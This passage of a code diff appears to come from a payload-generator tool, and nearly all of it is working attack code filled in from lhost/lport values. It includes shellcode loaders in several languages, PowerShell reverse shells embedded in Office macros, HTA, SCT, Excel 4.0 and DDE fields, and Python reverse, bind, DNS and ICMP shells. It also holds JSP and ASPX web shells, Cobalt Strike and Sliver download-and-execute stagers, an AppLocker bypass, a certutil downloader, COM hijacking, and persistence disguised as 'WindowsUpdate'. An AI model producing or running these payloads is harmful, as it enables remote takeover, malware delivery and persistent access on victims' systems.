+    0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0,
+    0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+    0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+    0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
 };
-int main() { ((void(*)())shellcode)(); return 0; }`
-          break
+int main() {
+    ((void(*)())shellcode)();
+    return 0;
+}`;
+          break;
         case 'python':
           rawCode = base + `import ctypes
-shellcode = bytes([0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00])
+
+# Replace with actual shellcode bytes from msfvenom
+shellcode = bytes([
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
+])
+
+# Allocate executable memory
 libc = ctypes.CDLL('libc.so.6')
 exec_mem = libc.valloc(len(shellcode))
 ctypes.memmove(exec_mem, shellcode, len(shellcode))
 libc.mprotect(exec_mem, len(shellcode), 0x7)
+
+# Execute
 func = ctypes.cast(exec_mem, ctypes.CFUNCTYPE(None))
-func()`
-          break
+func()`;
+          break;
         case 'go':
           rawCode = base + `package main
-import ("syscall"; "unsafe")
+
+import (
+    "syscall"
+    "unsafe"
+)
+
 func main() {
-    shellcode := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc}
-    exec, _ := syscall.Mmap(-1, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE)
+    shellcode := []byte{
+        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
+    }
+    exec, _ := syscall.Mmap(-1, 0, len(shellcode),
+        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
+        syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE)
     copy(exec, shellcode)
     syscall.Syscall(uintptr(exec), 0, 0, 0, 0)
-}`
-          break
+}`;
+          break;
+        case 'rust':
+          rawCode = base + `use std::mem;
+use std::ptr;
+use libc::{mmap, munmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};
+
+fn main() {
+    let shellcode: [u8; 10] = [
+        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
+    ];
+    unsafe {
+        let exec_mem = mmap(
+            ptr::null_mut(),
+            shellcode.len(),
+            PROT_READ | PROT_WRITE | PROT_EXEC,
+            MAP_ANONYMOUS | MAP_PRIVATE,
+            -1,
+            0,
+        );
+        ptr::copy(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
+        let func: fn() = mem::transmute(exec_mem);
+        func();
+        munmap(exec_mem, shellcode.len());
+    }
+}`;
+          break;
         default:
-          rawCode = base + `// Shellcode not implemented for ${format}`
+          rawCode = base + `// Shellcode not implemented for ${format}`;
       }
-      break
+      break;
     }
     case 'macro': {
       rawCode = base + `Sub AutoOpen()
     Dim cmd As String
     cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(""${lhost}"",${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }"
     CreateObject("WScript.Shell").Run cmd, 0, False
-End Sub`
-      break
+End Sub
+
+' ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'hta': {
       rawCode = base + `<html>
-<head><HTA:APPLICATION ID="oApp" APPLICATIONNAME="htaPayload" /></head>
+<head>
+    <HTA:APPLICATION ID="oApp" APPLICATIONNAME="HTAPayload" />
+    <title>HTA Payload</title>
+</head>
 <script language="JScript">
-function exec() {
-    var cmd = "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }";
-    new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
-}
-window.onload = exec;
+    function exec() {
+        var cmd = "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }";
+        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
+    }
+    window.onload = exec;
 </script>
-<body></body>
-</html>`
-      break
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
+<!-- ⚠️ LAB USE ONLY — unauthorized use is illegal -->`;
+      break;
     }
     case 'reverse_https':
-      rawCode = base + `// Reverse HTTPS example (Python with SSL)
-import socket, ssl, subprocess, os
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("${lhost}", ${lport}))
-ctx = ssl.create_default_context()
-ssl_sock = ctx.wrap_socket(sock, server_hostname="${lhost}")
-os.dup2(ssl_sock.fileno(), 0); os.dup2(ssl_sock.fileno(), 1); os.dup2(ssl_sock.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])`
-      break
-    case 'reverse_http':
-      rawCode = base + `# Reverse HTTP (Python) using requests
-import requests, subprocess, time
-while True:
+      rawCode = base + `# Reverse HTTPS shell — Python with SSL
+import socket, ssl, subprocess, os, sys
+
+def reverse_https():
     try:
-        r = requests.get(f'http://${lhost}:${lport}/cmd', timeout=5)
-        if r.status_code == 200 and r.text:
-            out = subprocess.check_output(r.text, shell=True)
-            requests.post(f'http://${lhost}:${lport}/result', data=out)
-    except: pass
-    time.sleep(2)`
-      break
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(("${lhost}", ${lport}))
+        ctx = ssl.create_default_context()
+        ssl_sock = ctx.wrap_socket(sock, server_hostname="${lhost}")
+        os.dup2(ssl_sock.fileno(), 0)
+        os.dup2(ssl_sock.fileno(), 1)
+        os.dup2(ssl_sock.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    reverse_https()`;
+      break;
+    case 'reverse_http':
+      rawCode = base + `# Reverse HTTP shell — Python with requests
+import requests, subprocess, time, sys
+
+def reverse_http():
+    while True:
+        try:
+            r = requests.get(f'http://${lhost}:${lport}/cmd', timeout=5)
+            if r.status_code == 200 and r.text:
+                out = subprocess.check_output(r.text, shell=True, stderr=subprocess.STDOUT)
+                requests.post(f'http://${lhost}:${lport}/result', data=out)
+        except:
+            pass
+        time.sleep(2)
+
+if __name__ == "__main__":
+    reverse_http()`;
+      break;
     case 'bind_https':
-      rawCode = base + `// Bind HTTPS (Python with SSL server)
-import socket, ssl, subprocess, os
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('0.0.0.0', ${lport}))
-sock.listen(1)
-conn, addr = sock.accept()
-ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-ctx.load_cert_chain('cert.pem', 'key.pem')
-ssl_conn = ctx.wrap_socket(conn, server_side=True)
-os.dup2(ssl_conn.fileno(), 0); os.dup2(ssl_conn.fileno(), 1); os.dup2(ssl_conn.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])`
-      break
+      rawCode = base + `# Bind HTTPS shell — Python SSL server
+import socket, ssl, subprocess, os, sys
+
+def bind_https():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind(('0.0.0.0', ${lport}))
+        sock.listen(1)
+        conn, addr = sock.accept()
+        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        # Load cert.pem and key.pem
+        ctx.load_cert_chain('cert.pem', 'key.pem')
+        ssl_conn = ctx.wrap_socket(conn, server_side=True)
+        os.dup2(ssl_conn.fileno(), 0)
+        os.dup2(ssl_conn.fileno(), 1)
+        os.dup2(ssl_conn.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    bind_https()`;
+      break;
     case 'java_webshell':
       rawCode = base + `<%@ page import="java.io.*" %>
 <%
-String cmd = request.getParameter("cmd");
-if (cmd != null) {
-    Process p = Runtime.getRuntime().exec(cmd);
-    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-    String line;
-    while ((line = reader.readLine()) != null) out.println(line);
-}
-%>`
-      break
+    String cmd = request.getParameter("cmd");
+    if (cmd != null && !cmd.isEmpty()) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            out.println(line);
+        }
+    }
+%>`;
+      break;
     case 'aspx_webshell':
       rawCode = base + `<%@ Page Language="C#" %>
 <script runat="server">
-protected void Page_Load(object sender, EventArgs e) {
-    string cmd = Request["cmd"];
-    if (cmd != null) {
-        System.Diagnostics.Process p = new System.Diagnostics.Process();
-        p.StartInfo.FileName = "cmd.exe";
-        p.StartInfo.Arguments = "/c " + cmd;
-        p.StartInfo.RedirectStandardOutput = true;
-        p.StartInfo.UseShellExecute = false;
-        p.Start();
-        Response.Write(p.StandardOutput.ReadToEnd());
+    protected void Page_Load(object sender, EventArgs e) {
+        string cmd = Request["cmd"];
+        if (!string.IsNullOrEmpty(cmd)) {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + cmd;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.UseShellExecute = false;
+            p.Start();
+            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+        }
     }
-}
-</script>`
-      break
+</script>`;
+      break;
     case 'encrypted_shell':
-      rawCode = base + `# AES encrypted reverse shell (Python)
+      rawCode = base + `# AES encrypted reverse shell — Python
 from Crypto.Cipher import AES
-import socket, subprocess, os, base64
+import socket, subprocess, os, sys, base64
+
 key = b'0123456789abcdef'
 iv = b'1234567890abcdef'
+
 def encrypt(data):
     cipher = AES.new(key, AES.MODE_CBC, iv)
-    return cipher.encrypt(data + b' '*(16 - len(data)%16))
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("${lhost}", ${lport}))
-# ... send/receive encrypted data`
-      break
+    pad_len = 16 - (len(data) % 16)
+    padded = data + b' ' * pad_len
+    return cipher.encrypt(padded)
+
+def decrypt(data):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.decrypt(data).rstrip(b' ')
+
+def reverse_encrypted():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("${lhost}", ${lport}))
+        while True:
+            cmd = s.recv(1024)
+            if not cmd:
+                break
+            decrypted = decrypt(cmd).decode()
+            if decrypted == 'exit':
+                break
+            out = subprocess.check_output(decrypted, shell=True, stderr=subprocess.STDOUT)
+            s.send(encrypt(out))
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    reverse_encrypted()`;
+      break;
     case 'powershell_encoded':
-      rawCode = base + `# Encoded PowerShell command (base64)
+      rawCode = base + `# Encoded PowerShell command — base64
+# Generate the command:
 $code = '$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
 $encoded = [Convert]::ToBase64String($bytes)
-# Now run: powershell -EncodedCommand $encoded`
-      break
+Write-Host $encoded
+
+# Run with: powershell -EncodedCommand <encoded_string>`;
+      break;
     case 'csharp_loader':
       rawCode = base + `using System;
 using System.Runtime.InteropServices;
-class Program {
+
+class CSharpLoader {
     [DllImport("kernel32.dll")]
     static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")]
     static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
     static void Main() {
-        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc };
+        // Replace with actual shellcode from msfvenom
+        byte[] shellcode = new byte[] {
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
+        };
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
         Marshal.Copy(shellcode, 0, addr, shellcode.Length);
-        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
-}`
-      break
+}
+
+// Compile with: csc /platform:x64 /target:exe loader.cs`;
+      break;
     case 'dns_shell':
-      rawCode = base + `# DNS shell (Python using dnslib or scapy)
-# This is a basic example – actual implementation would be more complex
-import socket, subprocess, dns.resolver
+      rawCode = base + `# DNS shell — Python using dnslib
+# This is a minimal example. Full implementation requires a DNS server.
+import socket, subprocess, sys, dns.resolver
+
 def dns_query(host, cmd):
-    # encode command in subdomain
-    sub = '.'.join(cmd[:10]) + '.domain.com'
-    dns.resolver.query(sub, 'A')
-# ... implement full protocol`
-      break
+    # Encode command in subdomain
+    encoded = '.'.join(cmd[:10]) + '.domain.com'
+    try:
+        dns.resolver.query(encoded, 'A')
+    except:
+        pass
+
+def dns_shell():
+    # Poll for commands via DNS
+    while True:
+        # Read command from DNS TXT record
+        try:
+            answer = dns.resolver.resolve('cmd.domain.com', 'TXT')
+            cmd = answer[0].strings[0].decode()
+            if cmd == 'exit':
+                break
+            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            # Send output via DNS (truncated)
+            dns_query('domain.com', out.decode()[:100])
+        except:
+            pass
+
+if __name__ == "__main__":
+    dns_shell()`;
+      break;
     case 'icmp_shell':
-      rawCode = base + `# ICMP shell (Python using scapy)
+      rawCode = base + `# ICMP shell — Python using scapy
+# Requires: pip install scapy
 from scapy.all import *
-def icmp_listen():
-    sniff(filter="icmp", prn=lambda p: process_icmp(p))
-def send_response(data, src):
-    send(IP(dst=src)/ICMP(type="echo-reply")/data)
-# ... implement shell`
-      break
+import subprocess, sys
+
+def process_icmp(pkt):
+    if ICMP in pkt and pkt[ICMP].type == 8:  # Echo request
+        cmd = pkt[Raw].load.decode()
+        if cmd == 'exit':
+            sys.exit(0)
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        send(IP(dst=pkt[IP].src)/ICMP(type=0)/out)
+
+def icmp_shell():
+    sniff(filter="icmp", prn=process_icmp)
+
+if __name__ == "__main__":
+    icmp_shell()`;
+      break;
     case 'smb_shell':
-      rawCode = base + `# SMB shell using impacket (Python)
-# This would be a psexec-like implementation
-# Use smbexec.py or similar tools`
-      break
+      rawCode = base + `# SMB shell — Python using impacket
+# Requires: pip install impacket
+# This is a psexec-style implementation
+# Use smbexec.py from impacket:
+# smbexec.py <domain>/<user>:<password>@<target>`;
+      break;
     case 'ssh_shell':
       rawCode = base + `#!/bin/bash
+# SSH reverse tunnel — establish a reverse shell via SSH
+# Run this on the target:
 ssh -R ${lport}:localhost:22 user@${lhost}
-# Then from your machine: ssh -p ${lport} localhost`
-      break
+
+# Then from your machine:
+ssh -p ${lport} localhost
+
+# ⚠️ Requires SSH server on the target and valid credentials`;
+      break;
     case 'powershell_plain':
       rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
 $stream = $client.GetStream();
@@ -2017,77 +2881,98 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
     $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush()
 };
-$client.Close()`
-      break
+$client.Close()`;
+      break;
     case 'bash_reverse':
       rawCode = base + `#!/bin/bash
-bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
-      break
+bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
+
+# Fallback if /dev/tcp is unavailable:
+# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+      break;
     case 'wmi_shell': {
-      rawCode = base + `# WMI Shell (PowerShell)
+      rawCode = base + `# WMI Shell — PowerShell
 $cred = Get-Credential
 $Computer = "${lhost}"
 $Command = "cmd.exe /c whoami"
 $WMIClient = New-Object System.Management.ManagementClass("Win32_Process")
 $WMIClient.Scope = New-Object System.Management.ManagementScope("\\\\$Computer\\root\\cimv2", $cred)
 $WMIClient.Scope.Connect()
-$WMIClient.Create($Command)`
-      break
+$WMIClient.Create($Command)
+
+# For interactive use, use wmiexec.py from impacket`;
+      break;
     }
     case 'winrm_shell': {
-      rawCode = base + `# WinRM Shell (PowerShell)
+      rawCode = base + `# WinRM Shell — PowerShell
 $cred = Get-Credential
 $Computer = "${lhost}"
 Invoke-Command -ComputerName $Computer -ScriptBlock { whoami } -Credential $cred
-# Or:
-Enter-PSSession -ComputerName $Computer -Credential $cred`
-      break
+
+# Interactive session:
+Enter-PSSession -ComputerName $Computer -Credential $cred`;
+      break;
     }
     case 'cobalt_strike_beacon': {
-      rawCode = base + `# Cobalt Strike Beacon (PowerShell Stager)
+      rawCode = base + `# Cobalt Strike Beacon — PowerShell Stager
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/payload.ps1")
-# Generate actual Beacon using Cobalt Strike Arsenal`
-      break
+
+# ⚠️ This is a placeholder. Generate actual Beacon using Cobalt Strike's Arsenal.
+# The real Beacon is a reflective DLL with C2 profiles.`;
+      break;
     }
     case 'sliver_beacon': {
-      rawCode = base + `# Sliver C2 (PowerShell Stager)
+      rawCode = base + `# Sliver C2 — PowerShell Stager
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/sliver.ps1")
-# Generate actual Sliver implant using sliver-server`
-      break
+
+# ⚠️ Generate actual implant using sliver-server:
+# sliver-server
+# generate --http ${lhost}:${lport}`;
+      break;
     }
     case 'macos_reverse': {
       rawCode = base + `#!/usr/bin/env python3
 import socket, subprocess, os, sys
-def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("${lhost}", ${lport}))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    subprocess.call(["/bin/zsh", "-i"])
+
+def reverse_shell():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("${lhost}", ${lport}))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/zsh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
 if __name__ == "__main__":
-    main()`
-      break
+    reverse_shell()`;
+      break;
     }
     case 'msbuild_applocker_bypass': {
-      rawCode = base + `<!-- MSBuild AppLocker Bypass - .csproj file -->
+      rawCode = base + `<!-- MSBuild AppLocker Bypass — .csproj file -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Execute">
     <Code Type="C#" Language="C#" Source="
       using System;
       using System.Net;
       using System.Diagnostics;
-      class Program { static void Main() {
-        WebClient wc = new WebClient();
-        byte[] payload = wc.DownloadData("http://${lhost}:${lport}/payload.exe");
-        Process.Start("C:\\Windows\\Temp\\payload.exe");
-      }}
+      class Program {
+        static void Main() {
+          WebClient wc = new WebClient();
+          byte[] payload = wc.DownloadData("http://${lhost}:${lport}/payload.exe");
+          Process.Start("C:\\\\Windows\\\\Temp\\\\payload.exe");
+        }
+      }
     "/>
   </Target>
-</Project>`
-      break
+</Project>
+
+# Execute with:
+# C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj`;
+      break;
     }
     case 'regsvr32_squiblydoo': {
       rawCode = base + `<!-- Squiblydoo SCT File -->
@@ -2096,428 +2981,714 @@ if __name__ == "__main__":
 <registration progid="Test" classid="{A1112221-0000-0000-0000-000000000000}">
   <script language="JScript">
     <![CDATA[
-      var cmd = new ActiveXObject("WScript.Shell").Run("powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }", 0, false);
+      var cmd = new ActiveXObject("WScript.Shell").Run(
+        "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }",
+        0, false
+      );
     ]]>
   </script>
 </registration>
 </scriptlet>
-# Run with: regsvr32 /s /u /i:http://${lhost}:${lport}/payload.sct scrobj.dll`
-      break
+
+# Host on a web server and execute with:
+# regsvr32 /s /u /i:http://${lhost}:${lport}/payload.sct scrobj.dll`;
+      break;
     }
     case 'certutil_downloader': {
-      rawCode = base + `# Certutil Downloader (Batch)
+      rawCode = base + `# Certutil Downloader — Batch
 certutil -urlcache -f http://${lhost}:${lport}/payload.b64 payload.b64
 certutil -decode payload.b64 payload.exe
-payload.exe`
-      break
+payload.exe
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'excel4_macro': {
-      const psCommand = `powershell -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }`
-      const excelSafe = psCommand.replace(/\$/g, '$$$$')
+      const psCommand = `powershell -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }`;
+      const excelSafe = psCommand.replace(/\$/g, '$$$$');
       rawCode = base + `# Excel 4.0 Macro (XLM)
+# Paste this into an Excel 4.0 macro sheet
 =EXEC("${excelSafe}")
-=HALT()`
-      break
+=HALT()
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'dde_injection': {
       rawCode = base + `# DDE Injection Field
+# Insert as a Word/Excel field (Ctrl+F9 to create field)
 { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k mshta.exe http://${lhost}:${lport}/payload.hta" }
-# Or simpler: { DDEAUTO "c:\\\\windows\\\\system32\\\\mshta.exe" "http://${lhost}:${lport}/payload.hta" }
-# Insert as Word/Excel field`
-      break
+
+# Alternative:
+{ DDEAUTO "c:\\\\windows\\\\system32\\\\mshta.exe" "http://${lhost}:${lport}/payload.hta" }
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'donut_shellcode': {
-      rawCode = base + `// Donut Shellcode (C# Loader)
+      rawCode = base + `// Donut Shellcode — C# Loader
 using System;
 using System.Runtime.InteropServices;
-class Program {
+
+class DonutLoader {
     [DllImport("kernel32.dll")]
     static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")]
     static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
     static void Main() {
-        byte[] shellcode = new byte[] { /* DONUT GENERATED SHELLCODE */ };
+        // Replace with Donut-generated shellcode
+        byte[] shellcode = new byte[] {
+            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
+        };
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
         Marshal.Copy(shellcode, 0, addr, shellcode.Length);
-        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 }
-# Generate with: donut.exe -a 2 -f 1 -i payload.exe`
-      break
+
+# Generate shellcode with:
+# donut.exe -a 2 -f 1 -i payload.exe -o shellcode.bin`;
+      break;
     }
     case 'com_hijack': {
-      rawCode = base + `// COM Hijacking (Registry Modification)
-// Target: {GUID} - find COM object to hijack
-// Registry: HKCR\\CLSID\\{GUID}\\InprocServer32
-// Set value to malicious DLL path
+      rawCode = base + `# COM Hijacking — Registry Modification
+# Find a COM object to hijack (e.g., CLSID from a known application)
+# Modify the InprocServer32 key to point to your malicious DLL
 
-# PowerShell Example:
+# PowerShell example:
 $regPath = "HKCR:\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32"
 Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.dll"
-`
-      break
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'task_scheduler_persistence': {
-      rawCode = base + `# Task Scheduler Persistence (PowerShell)
+      rawCode = base + `# Task Scheduler Persistence — PowerShell
 $action = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\payload.exe"
 $trigger = New-ScheduledTaskTrigger -AtLogOn -User "SYSTEM"
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Password ""
 
 # Or using schtasks:
-schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM`
-      break
+schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'registry_persistence': {
-      rawCode = base + `# Registry Run Persistence (PowerShell)
+      rawCode = base + `# Registry Run Persistence — PowerShell
+# User-level persistence:
 $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
